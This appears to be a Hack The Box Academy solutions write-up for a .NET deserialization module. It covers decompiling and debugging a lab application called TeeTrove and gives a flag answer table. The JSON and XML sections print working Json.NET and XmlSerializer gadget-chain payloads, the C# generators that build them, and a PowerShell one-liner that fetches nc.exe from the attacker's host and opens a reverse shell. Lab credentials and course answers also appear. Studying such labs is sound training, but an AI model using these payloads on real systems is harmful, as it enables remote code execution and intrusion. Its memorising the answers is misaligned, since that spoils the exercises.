| Section                                    | Question Number | Answer                                |
| ------------------------------------------ | --------------- | ------------------------------------- |
| Decompiling .NET Applications              | Question 1      | 916344019f88b8d93993afa72b593b9c      |
| Identifying Vulnerable Functions           | Question 1      | Json.NET                              |
| Debugging .NET Applications                | Question 1      | HTB{pl4in\_T3xt\_is\_Th3\_b3sT\_t3Xt} |
| Example 1: JSON                            | Question 1      | HTB{js0n\_D35er1aliZation\_i5\_fuN}   |
| Example 2: XML                             | Question 1      | HTB{xMl\_5eR1aLiZaTi0N\_iS\_e4sy}     |
| Example 3: Binary                          | Question 1      | HTB{11001011011011111011010010}       |
| Automating Exploitation with YSoSerial.NET | Question 1      | HTB{whY\_s0\_S3r1ouS}                 |
| Skills Assessment                          | Question 1      | HTB{d3s3rialization\_3xp3rt}          |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Decompiling .NET Applications

## Question 1

### "Use the tool of your choice to decompile TeeTrove.dll. What is the value of the variable 'AUTH\_COOKIE\_SECRET' in 'TeeTrove.Authentication.AuthCookieUtil'?"

After spawning the target machine, students first need to connect to it with `xfreerdp` using the credentials `htb-admin:HTB_@cademy_admin!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-admin /p:HTB_@cademy_admin! /dynamic-resolution
```

```
┌─[eu-academy-1]─[10.10.14.55]─[htb-ac-413848@htb-tc5ef6lc4z]─[~]
└──╼ [★]$ xfreerdp /v:10.129.151.192 /u:htb-admin /p:HTB_@cademy_admin! /dynamic-resolution

[11:37:35:539] [5500:5501] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-413848/.config/freerdp
[11:37:35:539] [5500:5501] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-413848/.config/freerdp/certs]
[11:37:35:539] [5500:5501] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-413848/.config/freerdp/server]
[11:37:36:546] [5500:5501] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[11:37:36:546] [5500:5501] [WARN][com.freerdp.crypto] - CN = DESKTOP-NU10MTO
[11:37:36:546] [5500:5501] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[11:37:36:546] [5500:5501] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[11:37:36:546] [5500:5501] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[11:37:36:546] [5500:5501] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.151.192:3389) 
[11:37:36:546] [5500:5501] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[11:37:36:546] [5500:5501] [ERROR][com.freerdp.crypto] - Common Name (CN):
[11:37:36:546] [5500:5501] [ERROR][com.freerdp.crypto] - 	DESKTOP-NU10MTO
[11:37:36:546] [5500:5501] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.151.192:3389 (RDP-Server):
	Common Name: DESKTOP-NU10MTO
	Subject:     CN = DESKTOP-NU10MTO
	Issuer:      CN = DESKTOP-NU10MTO
	Thumbprint:  1a:7c:3b:e4:c5:02:e2:50:ad:36:2f:2b:df:7c:ec:18:28:ab:95:f4:3d:74:e6:0d:30:ed:b9:98:a6:5e:9f:e0
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Subsequently, students need to unzip `C:\Tools\ILSpy_binaries_8.2.0.7535-x64.zip` and `C:\Tools\TeeTrove.Publish.zip`. Then, using `C:\Tools\ILSpy.exe`, students need to open `C:\Tools\TeeTrove.Publish\TeeTrove.Publish\bin\TeeTrove.dll`:

![[HTB Solutions/Others/z. images/d96b2616f1ce036e4cee3c7c88da75d9_MD5.jpg]]

![[HTB Solutions/Others/z. images/030127095f5a1e409cdbda42de338c8f_MD5.jpg]]

When inspecting the `TeeTrove.Authentication.AuthCookieUtil` class, students will find out that the value of the `AUTH_COOKIE_SECRET` field is `916344019f88b8d93993afa72b593b9c`:

![[HTB Solutions/Others/z. images/41709df05da12d01f5f39c247f73df34_MD5.jpg]]

Answer: `916344019f88b8d93993afa72b593b9c`

# Identifying Vulnerable Functions

## Question 1

### "There is one more use of deserialization in the assembly which did not appear in the screenshot above. Find it, and submit the name of the serializer which is used as the answer."

After spawning the target machine, students first need to connect to it with `xfreerdp` using the credentials `htb-admin:HTB_@cademy_admin!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-admin /p:HTB_@cademy_admin! /dynamic-resolution
```

```
┌─[eu-academy-1]─[10.10.14.55]─[htb-ac-413848@htb-tc5ef6lc4z]─[~]
└──╼ [★]$ xfreerdp /v:10.129.151.192 /u:htb-admin /p:HTB_@cademy_admin! /dynamic-resolution

[11:37:35:539] [5500:5501] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-413848/.config/freerdp
[11:37:35:539] [5500:5501] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-413848/.config/freerdp/certs]
[11:37:35:539] [5500:5501] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-413848/.config/freerdp/server]
[11:37:36:546] [5500:5501] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[11:37:36:546] [5500:5501] [WARN][com.freerdp.crypto] - CN = DESKTOP-NU10MTO
[11:37:36:546] [5500:5501] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[11:37:36:546] [5500:5501] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[11:37:36:546] [5500:5501] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[11:37:36:546] [5500:5501] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.151.192:3389) 
[11:37:36:546] [5500:5501] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[11:37:36:546] [5500:5501] [ERROR][com.freerdp.crypto] - Common Name (CN):
[11:37:36:546] [5500:5501] [ERROR][com.freerdp.crypto] - 	DESKTOP-NU10MTO
[11:37:36:546] [5500:5501] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.151.192:3389 (RDP-Server):
	Common Name: DESKTOP-NU10MTO
	Subject:     CN = DESKTOP-NU10MTO
	Issuer:      CN = DESKTOP-NU10MTO
	Thumbprint:  1a:7c:3b:e4:c5:02:e2:50:ad:36:2f:2b:df:7c:ec:18:28:ab:95:f4:3d:74:e6:0d:30:ed:b9:98:a6:5e:9f:e0
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Subsequently, students need to unzip `C:\Tools\ILSpy_binaries_8.2.0.7535-x64.zip` and `C:\Tools\TeeTrove.Publish.zip`. Then, using `C:\Tools\ILSpy.exe`, students need to open `C:\Tools\TeeTrove.Publish\TeeTrove.Publish\bin\TeeTrove.dll`:

![[HTB Solutions/Others/z. images/381f00dcfd21d91e94ebd3ff7aa97df9_MD5.webp]]

Students need to use `Save Code...` on `TeeTrove`:

![[HTB Solutions/Others/z. images/f0096e80bd310f79d4a6556f0f3c70c5_MD5.jpg]]

Students are encouraged to save the C# project in an empty folder:

![[HTB Solutions/Others/z. images/8a32ccb5e32f45ed8402a5ef3adc5109_MD5.jpg]]

Afterward, students need to open PowerShell in the same directory as the C# project (`Shift` + `Right-Click` + `Open PowerShell window here`):

![[HTB Solutions/Others/z. images/751e875fa2047fad94bdaca5f4935ad8_MD5.jpg]]

At last, using the `Select-String` cmdlet, students will find that the `TeeTrove.Authentication\RememberMeUtil.cs` class uses the `JsonConvert.DeserializeObject` function, which belongs to `Json.NET`:

Code: powershell

```powershell
Select-String -Pattern "\.Deserialize.*\(" -Path "*/*" -Include "*.cs"
```

```
PS C:\Users\htb-admin\Desktop\TeeTrove> Select-String -Pattern "\.Deserialize.*\(" -Path "*/*" -Include "*.cs"

<SNIP>
TeeTrove.Authentication\RememberMeUtil.cs:28: RememberMe rememberMe = (RememberMe)JsonConvert.DeserializeObject(cookie, new JsonSerializerSettings
<SNIP>
```

Answer: `Json.NET`

# Debugging .NET Applications

## Question 1

### "Inside 'TeeTrove.Controllers.TeeController', there is a dynamically initialized variable called 'secret3'. Use debugging to determine its value at runtime, and enter that value as the answer below. Use the credentials 'pentest:pentest' to log into the website."

After spawning the target machine, students first need to connect to it with `xfreerdp` using the credentials `htb-admin:HTB_@cademy_admin!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-admin /p:HTB_@cademy_admin! /dynamic-resolution
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-rlrdxdwny8]─[~]
└──╼ [★]$ xfreerdp /v:10.129.228.230 /u:htb-admin /p:HTB_@cademy_admin! /dynamic-resolution

[05:54:26:963] [2595:2596] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-413848/.config/freerdp
[05:54:26:963] [2595:2596] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-413848/.config/freerdp/certs]
[05:54:26:964] [2595:2596] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-413848/.config/freerdp/server]
[05:54:27:472] [2595:2596] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[05:54:27:472] [2595:2596] [WARN][com.freerdp.crypto] - CN = DESKTOP-NU10MTO
[05:54:27:472] [2595:2596] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:54:27:472] [2595:2596] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[05:54:27:472] [2595:2596] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:54:27:472] [2595:2596] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.228.230:3389) 
[05:54:27:472] [2595:2596] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[05:54:27:472] [2595:2596] [ERROR][com.freerdp.crypto] - Common Name (CN):
[05:54:27:472] [2595:2596] [ERROR][com.freerdp.crypto] - 	DESKTOP-NU10MTO
[05:54:27:472] [2595:2596] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.228.230:3389 (RDP-Server):
	Common Name: DESKTOP-NU10MTO
	Subject:     CN = DESKTOP-NU10MTO
	Issuer:      CN = DESKTOP-NU10MTO
	Thumbprint:  1a:7c:3b:e4:c5:02:e2:50:ad:36:2f:2b:df:7c:ec:18:28:ab:95:f4:3d:74:e6:0d:30:ed:b9:98:a6:5e:9f:e0
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Subsequently, students need to extract `C:\Tools\TeeTrove.Publish.zip` and then move its deployment files to `C:\inetpub\wwwroot\`:

Code: powershell

```powershell
mv C:\Tools\TeeTrove.Publish\TeeTrove.Publish\ C:\inetpub\wwwroot\
```

```
PS C:\Users\htb-admin> mv C:\Tools\TeeTrove.Publish\TeeTrove.Publish\ C:\inetpub\wwwroot\
```

Students also need to edit the connection string's `Data Source` to be `C:\inetpub\wwwroot\TeeTrove.Publish\TeeTrove.db`:

![[HTB Solutions/Others/z. images/102ccd6cdf7930a51cc7f6140a38f195_MD5.jpg]]

Afterward, students need to launch `IIS Manager`:

![[HTB Solutions/Others/z. images/0aa254b58de110e207e435715997965b_MD5.jpg]]

Students need to add a new website:

![[HTB Solutions/Others/z. images/95e9a914d1788ef3887b3c6afbc9bbed_MD5.jpg]]

After making sure that the website has the appropriate configuration parameters, students need to add it:

![[HTB Solutions/Others/z. images/5229370100b2cdd7373216f3c2b01ed0_MD5.jpg]]

Subsequently, students need to import the PowerShell module `C:\Tools\IISAssemblyDebugging.psm1`:

Code: powershell

```powershell
Import-Module C:\Tools\IISAssemblyDebugging.psm1
```

```
PS C:\Users\htb-admin> Import-Module C:\Tools\IISAssemblyDebugging.psm1
```

Students need to use `Enable-IISAssemblyDebugging` on `C:\inetpub\wwwroot\TeeTrove.Publish\` to prevent `IIS` from optimizing the website's (i.e., `TeeTrove`) assemblies when running:

Code: powershell

```powershell
Enable-IISAssemblyDebugging C:\inetpub\wwwroot\TeeTrove.Publish\
```

```
PS C:\Users\htb-admin> Enable-IISAssemblyDebugging C:\inetpub\wwwroot\TeeTrove.Publish\
```

Afterward, students need to extract `C:\Tools\dnSpy-net-win64` and run `dnSpy` as administrator; then, students need open (by pressing `Ctrl` + `O`) all the `dll` files inside of `C:\inetpub\wwwroot\TeeTrove.Publish\bin\`:

![[HTB Solutions/Others/z. images/a60fb3d84ed67e3167720c1581d50027_MD5.jpg]]

Before attempting to attach to the `IIS` process, and to avoid the `IIS` process not showing up in `dnSpy`, students should visit the website at `http://127.0.0.1:8000/`. Afterward, students need to attach (by pressing `Ctrl` + `Alt` + `P`) to the `w3wp.exe` process:

![[HTB Solutions/Others/z. images/77299a683dba9734c8f835b05910febe_MD5.jpg]]

Students need to set a breakpoint on line 38 in `TeeTrove.Controllers.TeeController`:

![[HTB Solutions/Others/z. images/414d489dab29427efe3922d43ef433a8_MD5.jpg]]

After that, students need to visit `http://127.0.0.1:8000/Auth/Login` and log in using the credentials `pentest:pentest`:

![[HTB Solutions/Others/z. images/e0815e4fb905864d051be7efebbf2bc1_MD5.jpg]]

Then, students need to navigate to the `/Tees` webpage:

![[HTB Solutions/Others/z. images/fe2ac63922e404e2c80ac6da2ae84324_MD5.jpg]]

At last, when checking `dnSpy`, students will notice that the debugger has hit the breakpoint and that the value of `secret3` is `HTB{pl4in_T3xt_is_Th3_b3sT_t3Xt}`:

![[HTB Solutions/Others/z. images/8b5347c39551fc2510bfaf02826213a8_MD5.jpg]]

Answer: `HTB{pl4in_T3xt_is_Th3_b3sT_t3Xt}`

# Example 1: JSON

## Question 1

### "Modify the JSON payload so that you receive a reverse shell, and submit the contents of 'C:\\Users\\Public\\Documents\\flag.txt' as the answer."

Students need to construct a PowerShell payload that uploads a Windows `netcat` binary to the target machine and initiates a reverse shell connection to utilize it in the JSON payload:

Code: powershell

```powershell
(new-object net.webclient).downloadfile("http://PWNIP:PWNPO/nc.exe", "c:\windows\tasks\nc.exe");
c:\windows\tasks\nc.exe -nv PWNIP PWNPO -e c:\windows\system32\cmd.exe;
```

To encode the payload, students need to convert it to `UTF-16LE` (`16-bit Unicode Transformation Format Little-Endian`) and then Base64-encode it. Students can use the following Python3 one-liner to encode the payload, replacing `PAYLOAD` with the actual PowerShell one:

Code: python

```python
python3 -c 'import base64; print(base64.b64encode((r"""PAYLOAD""").encode("utf-16-le")).decode())'
```

Code: shell

```shell
python3 -c 'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://PWNIP:PWNPO/nc.exe", "c:\windows\tasks\nc.exe");c:\windows\tasks\nc.exe -nv PWNIP PWNPO -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-73ijfxwa0x]─[~]
└──╼ [★]$ python3 -c 'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://10.10.15.103:9001/nc.exe", "c:\windows\tasks\nc.exe");c:\windows\tasks\nc.exe -nv 10.10.15.103 9002 -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'

KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA1AC4AMQAwADMAOgA5ADAAMAAxAC8AbgBjAC4AZQB4AGUAIgAsACAAIgBjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIgApADsAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAYQBzAGsAcwBcAG4AYwAuAGUAeABlACAALQBuAHYAIAAxADAALgAxADAALgAxADUALgAxADAAMwAgADkAMAAwADIAIAAtAGUAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAcwB5AHMAdABlAG0AMwAyAFwAYwBtAGQALgBlAHgAZQA7AA==
```

Using the same procedures as in the section, students need to write C# code that automates the creation of the JSON payload (making sure to replace `BASE64_PAYLOAD` with the actual PowerShell payload):

Code: csharp

```csharp
using Newtonsoft.Json;
using System;
using System.Windows.Data;

namespace RememberMeExploitPoC
{
    internal class Program
    {
        static void Main(string[] args)
        {
            ObjectDataProvider objectDataProvider = new ObjectDataProvider();
            objectDataProvider.ObjectType = typeof(System.Diagnostics.Process);
            objectDataProvider.MethodParameters.Add(@"C:\Windows\System32\WindowsPowerShell\V1.0\powershell.exe");
            objectDataProvider.MethodParameters.Add("-WindowStyle Hidden -NonInteractive -exec bypass -enc BASE64_PAYLOAD");
            objectDataProvider.MethodName = "Start1";

            JsonSerializerSettings jsonSerializerSettings = new JsonSerializerSettings()
            {
                TypeNameHandling = TypeNameHandling.All
            };
            string payload = JsonConvert.SerializeObject(objectDataProvider, jsonSerializerSettings);

            payload = payload.Remove(payload.LastIndexOf("},") + 1);
            payload = payload.Replace("\"MethodName\":\"Start1\",", "");
            payload = $"{payload},\"MethodName\":\"Start\"}}";
            Console.WriteLine(payload);
            Console.ReadLine();
        }
    }
}
```

After running the C# code, students will attain the JSON payload:

Code: json

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "ObjectType": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
  "MethodParameters": {
    "$type": "MS.Internal.Data.ParameterCollection, PresentationFramework",
    "$values": [
      "C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "-WindowStyle Hidden -NonInteractive -exec bypass -enc BASE64_PAYLOAD"
    ]
  },
  "MethodName": "Start"
}
```

Students also need to download a compiled version of `nc` for Microsoft Windows from [GitHub](https://github.com/int0x33/nc.exe/raw/master/nc.exe):

Code: shell

```shell
wget https://github.com/int0x33/nc.exe/raw/master/nc.exe
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-73ijfxwa0x]─[~]
└──╼ [★]$ wget https://github.com/int0x33/nc.exe/raw/master/nc.exe

--2023-11-28 11:40:27--  https://github.com/int0x33/nc.exe/raw/master/nc.exe
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
<SNIP>
```

Additionally, students need to start an HTTP web server using the same port specified for it in the PowerShell payload to allow the target machine to fetch `nc.exe` (9001 in here):

Code: shell

```shell
python -m http.server PWNPO
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-xhjvsibqln]─[~]
└──╼ [★]$ python -m http.server 9001

Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
```

Moreover, students need to start an `nc` listener to catch the reverse shell connection using the same port specified for it in the PowerShell payload (9002 in here):

Code: shell

```shell
nc -nvlp PWNPO
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-xhjvsibqln]─[~]
└──╼ [★]$ nc -nvlp 9002

Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9002
Ncat: Listening on 0.0.0.0:9002
```

Subsequently, students need to spawn the target machine, navigate to `http://STMIP:8000/Auth/Login`, and log in using the credentials `pentest:pentest`, making sure to check the `Remember me` checkbox:

![[HTB Solutions/Others/z. images/d8529b795b2b1d49a6dbf73a821339d6_MD5.jpg]]

After updating the value of the `TTREMEMBER` cookie to be that of the JSON payload, students need to log out, triggering the exploit:

![[HTB Solutions/Others/z. images/df59d3db58f26237e9acef2be2dbc672_MD5.jpg]]

When checking the `nc` listener, students will notice that the reverse shell connection has been established successfully:

```
Ncat: Connection from 10.129.228.224.
Ncat: Connection from 10.129.228.224:51580.
Microsoft Windows [Version 10.0.19045.3570]
(c) Microsoft Corporation. All rights reserved.

C:\windows\system32\inetsrv>whoami

iis apppool\.net v4.5
```

At last, when reading the contents of `C:\Users\Public\Documents\flag.txt`, students will attain the flag `HTB{js0n_D35er1aliZation_i5_fuN}`:

Code: cmd

```cmd
more C:\Users\Public\Documents\flag.txt
```

```
C:\windows\system32\inetsrv>more C:\Users\Public\Documents\flag.txt

HTB{js0n_D35er1aliZation_i5_fuN}
```

Answer: `HTB{js0n_D35er1aliZation_i5_fuN}`

# Example 2: XML

## Question 1

### "Modify our final payload to get a reverse shell on TeeTrove, and submit the contents of 'C:\\Windows\\System32\\drivers\\etc\\flag.txt' as the answer."

Students need to construct a PowerShell payload that uploads a Windows `netcat` binary to the target machine and initiates a reverse shell connection to utilize it in the XML payload:

Code: powershell

```powershell
(new-object net.webclient).downloadfile("http://PWNIP:PWNPO/nc.exe", "c:\windows\tasks\nc.exe");
c:\windows\tasks\nc.exe -nv PWNIP PWNPO -e c:\windows\system32\cmd.exe;
```

To encode the payload, students need to convert it to `UTF-16LE` (`16-bit Unicode Transformation Format Little-Endian`) and then Base64-encode it. Students can use the following Python3 one-liner to encode the payload, replacing `PAYLOAD` with the actual PowerShell one:

Code: python

```python
python3 -c 'import base64; print(base64.b64encode((r"""PAYLOAD""").encode("utf-16-le")).decode())'
```

Code: shell

```shell
python3 -c 'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://PWNIP:PWNPO/nc.exe", "c:\windows\tasks\nc.exe");c:\windows\tasks\nc.exe -nv PWNIP PWNPO -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-73ijfxwa0x]─[~]
└──╼ [★]$ python3 -c 'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://10.10.15.103:9001/nc.exe", "c:\windows\tasks\nc.exe");c:\windows\tasks\nc.exe -nv 10.10.15.103 9002 -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'

KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA1AC4AMQAwADMAOgA5ADAAMAAxAC8AbgBjAC4AZQB4AGUAIgAsACAAIgBjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIgApADsAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAYQBzAGsAcwBcAG4AYwAuAGUAeABlACAALQBuAHYAIAAxADAALgAxADAALgAxADUALgAxADAAMwAgADkAMAAwADIAIAAtAGUAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAcwB5AHMAdABlAG0AMwAyAFwAYwBtAGQALgBlAHgAZQA7AA==
```

Using the same procedures as in the section, students need to write C# code that automates the creation of the XML payload (making sure to replace `BASE64_PAYLOAD` with the actual PowerShell payload):

Code: csharp

```csharp
using System;
using System.Diagnostics;
using System.Windows.Data;
using System.Windows.Markup;
using System.Data.Services.Internal;
using System.IO;
using System.Xml.Serialization;
using System.Text;
using System.Xml;

namespace PoC
{
    internal class Program
    {
        static void Main(string[] args)
        {
            ProcessStartInfo processStartInfo = new ProcessStartInfo();
            processStartInfo.FileName =
                @"C:\Windows\System32\WindowsPowerShell\V1.0\powershell.exe";
            processStartInfo.Arguments = "-WindowStyle Hidden -NonInteractive -exec bypass -enc BASE64_PAYLOAD";
            Process process = new Process();
            process.StartInfo = processStartInfo;

            ObjectDataProvider objectDataProvider = new ObjectDataProvider();
            objectDataProvider.ObjectInstance = process;
            objectDataProvider.MethodName = "Start";

            string payload = XamlWriter.Save(objectDataProvider);
            XmlDocument xmlDocument = new XmlDocument();
            xmlDocument.LoadXml(payload);
            XmlNamespaceManager xmlNamespaceManager = new XmlNamespaceManager(
                xmlDocument.NameTable
            );
            xmlNamespaceManager.AddNamespace(
                "sd",
                "clr-namespace:System.Diagnostics;assembly=System"
            );

            XmlNode xmlNode = xmlDocument.SelectSingleNode(
                "//sd:ProcessStartInfo.EnvironmentVariables",
                xmlNamespaceManager
            );
            xmlNode.ParentNode.RemoveChild(xmlNode);
            payload = xmlDocument.OuterXml;

            ExpandedWrapper<XamlReader, ObjectDataProvider> expandedWrapper = new ExpandedWrapper<
                XamlReader,
                ObjectDataProvider
            >();
            expandedWrapper.ProjectedProperty0 = new ObjectDataProvider();
            expandedWrapper.ProjectedProperty0.ObjectInstance = new XamlReader();
            expandedWrapper.ProjectedProperty0.MethodName = "Parse";
            expandedWrapper.ProjectedProperty0.MethodParameters.Add(payload);

            MemoryStream memoryStream = new MemoryStream();
            XmlSerializer xmlSerializer = new XmlSerializer(expandedWrapper.GetType());
            xmlSerializer.Serialize(memoryStream, expandedWrapper);
            payload = Encoding.ASCII.GetString(memoryStream.ToArray());
            payload = payload
                .Replace("<ExpandedWrapperOfXamlReaderObjectDataProvider", "<Tee")
                .Replace("</ExpandedWrapperOfXamlReaderObjectDataProvider>", "</Tee>");

            Console.WriteLine(payload);
            Console.ReadLine();
        }
    }
}
```

After running the C# code, students will attain the XML payload:

Code: xml

```xml
<?xml version="1.0"?>
<Tee
	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xmlns:xsd="http://www.w3.org/2001/XMLSchema">
	<ProjectedProperty0>
		<ObjectInstance xsi:type="XamlReader" />
		<MethodName>Parse</MethodName>
		<MethodParameters>
			<anyType xsi:type="xsd:string">&lt;ObjectDataProvider MethodName="Start"
				xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
				xmlns:sd="clr-namespace:System.Diagnostics;assembly=System"
				xmlns:sc="clr-namespace:System.Collections;assembly=mscorlib"
				xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"&gt;&lt;ObjectDataProvider.ObjectInstance&gt;&lt;sd:Process&gt;&lt;sd:Process.StartInfo&gt;&lt;sd:ProcessStartInfo Arguments="-WindowStyle Hidden -NonInteractive -exec bypass -enc BASE64_PAYLOAD" StandardErrorEncoding="{x:Null}" StandardOutputEncoding="{x:Null}" UserName="" Password="{x:Null}" Domain="" LoadUserProfile="False" FileName="C:\Windows\System32\WindowsPowerShell\V1.0\powershell.exe"&gt;&lt;/sd:ProcessStartInfo&gt;&lt;/sd:Process.StartInfo&gt;&lt;/sd:Process&gt;&lt;/ObjectDataProvider.ObjectInstance&gt;&lt;/ObjectDataProvider&gt;
			</anyType>
		</MethodParameters>
	</ProjectedProperty0>
</Tee>
```

Additionally, students need to attain the string equivalent of `new ExpandedWrapper<XamlReader, ObjectDataProvider>().GetType().AssemblyQualifiedName` to send it as the type the `XmlSerializer` class gets initialized with:

Code: csharp

```csharp
Console.WriteLine(new ExpandedWrapper<XamlReader, ObjectDataProvider>().GetType().AssemblyQualifiedName);
```

```
System.Data.Services.Internal.ExpandedWrapper\`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
```

Students also need to download a compiled version of `nc` for Microsoft Windows from [GitHub](https://github.com/int0x33/nc.exe/raw/master/nc.exe):

Code: shell

```shell
wget https://github.com/int0x33/nc.exe/raw/master/nc.exe
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-73ijfxwa0x]─[~]
└──╼ [★]$ wget https://github.com/int0x33/nc.exe/raw/master/nc.exe

--2023-11-28 11:40:27--  https://github.com/int0x33/nc.exe/raw/master/nc.exe
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
<SNIP>
```

Additionally, students need to start an HTTP web server using the same port specified for it in the PowerShell payload to allow the target machine to fetch `nc.exe` (9001 in here):

Code: shell

```shell
python -m http.server PWNPO
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-xhjvsibqln]─[~]
└──╼ [★]$ python -m http.server 9001

Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
```

Moreover, students need to start an `nc` listener to catch the reverse shell connection using the same port specified for it in the PowerShell payload (9002 in here):

Code: shell

```shell
nc -nvlp PWNPO
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-xhjvsibqln]─[~]
└──╼ [★]$ nc -nvlp 9002

Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9002
Ncat: Listening on 0.0.0.0:9002
